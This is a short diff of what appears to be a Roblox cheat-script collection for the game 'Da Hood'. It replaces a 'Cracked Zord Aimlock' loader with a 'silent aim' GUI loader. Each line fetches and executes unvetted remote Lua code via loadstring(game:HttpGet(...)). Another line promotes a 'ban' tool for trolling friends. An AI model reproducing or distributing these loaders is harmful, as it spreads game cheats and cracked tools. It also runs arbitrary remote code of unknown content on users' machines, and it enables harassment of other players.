@@ -7,8 +7,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/Dah
 The ban thing is not a joke. Use it on your alt or troll your friends.
 
 
--- // - Cracked Zord Aimlock - \\ --
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/ZordAImlockCracked1.0V/main/1.0V"))()
+-- // - GuizzyGui Da hood New added sliet aim - \\ --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/MaybeNewSlietAim/main/Mk"))()
 
 
 -- // - Korblox Code - \\ --
